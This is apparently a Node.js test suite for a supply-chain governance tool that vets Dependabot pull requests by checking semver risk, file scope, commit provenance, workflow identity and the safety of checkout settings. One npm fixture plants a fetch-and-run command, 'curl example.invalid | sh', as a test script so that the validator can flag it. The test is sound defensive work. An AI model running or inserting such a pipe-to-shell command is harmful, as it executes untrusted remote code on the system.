import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  classifyEcosystem,
  compareSemver,
  eventPullNumber,
  parseDependabotMetadata,
  parsePositiveInteger,
  reconcileIndependently,
  selectQualificationRun,
  validateActionsSemanticChange,
  validateConfig,
  validateDockerSemanticChange,
  validateNpmSemanticChange,
  validateProvenance,
  validateSignedMetadata,
  workflowIdentityMatches,
} from './dependency-governance.mjs';

const config = JSON.parse(readFileSync('.github/dependency-governance.json', 'utf8'));
const meta = (name, updateType = 'version-update:semver-patch') => [{ name, version: '1.2.4', updateType }];

test('semver and signed metadata stay fail closed', () => {
  assert.equal(compareSemver('1.2.3', '1.2.4').risk, 'patch');
  assert.equal(compareSemver('1.2.3', '1.3.0').risk, 'minor');
  assert.equal(compareSemver('1.2.3', '2.0.0').risk, 'major');
  assert.equal(compareSemver('0.2.3', '0.3.0').risk, 'major-risk');
  assert.equal(compareSemver('1.2.3', '1.2.2').risk, 'downgrade');
  const message = `x\nupdated-dependencies:\n- dependency-name: webdriverio\n  dependency-version: 9.20.0\n  dependency-type: direct:development\n  update-type: version-update:semver-patch\n...\n`;
  assert.equal(parseDependabotMetadata(message)[0].name, 'webdriverio');
});

test('file scope maps to one ecosystem only', () => {
  assert.equal(classifyEcosystem([{ filename: 'package.json' }, { filename: 'package-lock.json' }], config), 'npm');
  assert.equal(classifyEcosystem([{ filename: 'Dockerfile' }], config), 'docker');
  assert.equal(classifyEcosystem([{ filename: '.github/workflows/docs.yml' }], config), 'github-actions');
  assert.equal(classifyEcosystem([{ filename: 'package.json' }, { filename: 'README.md' }], config), 'unknown');
});

function npmFixture(from = '^1.2.3', to = '^1.2.4') {
  const basePackage = { name: 'x', version: '1.0.0', scripts: { test: 'node --test' }, dependencies: { express: from } };
  const headPackage = structuredClone(basePackage);
  headPackage.dependencies = { express: to };
  const baseLock = { name: 'x', version: '1.0.0', lockfileVersion: 3, packages: { '': { name: 'x', version: '1.0.0', dependencies: { express: from } }, 'node_modules/express': { version: from.replace('^', ''), integrity: 'sha512-old' } } };
  const headLock = { name: 'x', version: '1.0.0', lockfileVersion: 3, packages: { '': { name: 'x', version: '1.0.0', dependencies: { express: to } }, 'node_modules/express': { version: to.replace('^', ''), integrity: 'sha512-new' } } };
  return { basePackage, headPackage, baseLock, headLock };
}

test('npm semantics allow only direct patch/minor dependency changes', () => {
  const patch = npmFixture();
  assert.equal(validateNpmSemanticChange(patch.basePackage, patch.headPackage, patch.baseLock, patch.headLock, meta('express')).eligible, true);
  const major = npmFixture('^1.2.3', '^2.0.0');
  assert.equal(validateNpmSemanticChange(major.basePackage, major.headPackage, major.baseLock, major.headLock, meta('express', 'version-update:semver-major')).eligible, false);
  patch.headPackage.scripts.test = 'curl example.invalid | sh';
  assert.match(validateNpmSemanticChange(patch.basePackage, patch.headPackage, patch.baseLock, patch.headLock, meta('express')).reasons.join('\n'), /outside dependency declarations/);
});

test('Docker and Actions semantic scopes remain immutable and non-major', () => {
  const baseDocker = 'FROM node:24.20.0-alpine3.24@sha256:' + 'a'.repeat(64) + '\nRUN echo safe\n';
  const patchDocker = 'FROM node:24.20.1-alpine3.24@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
  assert.equal(validateDockerSemanticChange(baseDocker, patchDocker, meta('node'), ['node']).eligible, true);
  const file = '.github/workflows/docs.yml';
  const base = `steps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v7.0.0\n`;
  const patch = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v7.0.1\n`;
  assert.equal(validateActionsSemanticChange([{ filename: file }], { [file]: base }, { [file]: patch }, meta('actions/checkout'), config.manualReviewPaths).eligible, true);
  const security = '.github/workflows/security.yml';
  assert.match(validateActionsSemanticChange([{ filename: security }], { [security]: base }, { [security]: patch }, meta('actions/checkout'), config.manualReviewPaths).reasons.join('\n'), /control-plane/);
});

test('governance config protects the control plane and excludes major updates', () => {
  assert.deepEqual(validateConfig(config), []);
  assert.ok(validateConfig({ ...config, allowedUpdateTypes: [...config.allowedUpdateTypes, 'version-update:semver-major'] }).length > 0);
  assert.ok(validateConfig({ ...config, manualReviewPaths: [] }).length > 0);
});

function canonicalFixture() {
  const baseSha = 'a'.repeat(40);
  const headSha = 'b'.repeat(40);
  const pull = { number: 41, user: { login: config.botLogin, id: config.botUserId }, base: { ref: config.baseBranch, repo: { full_name: 'o/r' } }, head: { ref: 'dependabot/npm_and_yarn/routine', repo: { full_name: 'o/r' }, sha: headSha }, draft: false, labels: [], created_at: '2026-09-01T12:00:00Z', commits: 1 };
  const commit = { sha: headSha, author: { login: config.botLogin, id: config.botUserId }, committer: { login: config.trustedCommitterLogin }, commit: { author: { name: config.botLogin, email: config.botAuthorEmail }, committer: { name: config.gitCommitterName, email: config.gitCommitterEmail }, verification: { verified: true, reason: 'valid', signature: 'fixture-signature' }, message: `x\nupdated-dependencies:\n- dependency-name: webdriverio\n  dependency-version: 9.20.0\n  dependency-type: direct:development\n  update-type: version-update:semver-patch\n...\n\n${config.signedOffBy}` }, parents: [{ sha: baseSha }] };
  return { baseSha, headSha, pull, commit };
}

test('provenance requires canonical signed Dependabot and a current-base single commit', () => {
  const f = canonicalFixture();
  assert.equal(validateProvenance({ pull: f.pull, commits: [f.commit], baseSha: f.baseSha, config, now: new Date('2026-09-02T12:00:00Z') }).eligible, true);
  const spoof = structuredClone(f.commit); spoof.author.id = 123; spoof.commit.verification.reason = 'unknown_key';
  assert.equal(validateProvenance({ pull: f.pull, commits: [spoof], baseSha: f.baseSha, config, now: new Date('2026-09-02T12:00:00Z') }).eligible, false);
  assert.equal(validateProvenance({ pull: f.pull, commits: [f.commit], baseSha: 'c'.repeat(40), config, now: new Date('2026-09-02T12:00:00Z') }).eligible, false);
  assert.equal(validateSignedMetadata(f.commit, config).eligible, true);
});

test('qualification proof binds exact workflow identity and stable gate source', () => {
  const f = canonicalFixture(); const requirement = config.requiredWorkflows[0];
  const run = { id: 10, name: requirement.workflow, path: `.github/workflows/${requirement.file}`, event: 'pull_request', head_sha: f.headSha, head_branch: f.pull.head.ref, pull_requests: [], updated_at: '2026-09-02T10:00:00Z' };
  assert.equal(workflowIdentityMatches(run, f.pull, requirement), true);
  assert.equal(workflowIdentityMatches({ ...run, path: '.github/workflows/fake.yml' }, f.pull, requirement), false);
  assert.equal(selectQualificationRun([{ ...run, id: 11, path: '.github/workflows/fake.yml', updated_at: '2026-09-02T11:00:00Z' }, run], f.pull, requirement).id, 10);
});

test('manual input parsing and scheduled reconciliation are bounded', async () => {
  assert.equal(parsePositiveInteger('41'), 41);
  assert.equal(eventPullNumber({ inputs: { 'pr-number': '41' } }, 'workflow_dispatch'), 41);
  assert.throws(() => parsePositiveInteger('0'));
  const result = await reconcileIndependently([{ number: 1 }, { number: 2 }], async (pull) => { if (pull.number === 2) throw new Error('boom'); return 'ok'; });
  assert.deepEqual(result.results.map((item) => item.number), [1]);
  assert.deepEqual(result.failures, [{ number: 2, error: 'boom' }]);
});

test('privileged workflow checks out trusted default branch only', () => {
  const workflow = readFileSync('.github/workflows/dependency-governance.yml', 'utf8');
  assert.match(workflow, /pull_request_target:/);
  assert.match(workflow, /workflow_run:/);
  assert.match(workflow, /schedule:/);
  assert.match(workflow, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/);
  assert.match(workflow, /persist-credentials: false/);
  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.pull_request\.head/);
  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha/);
});
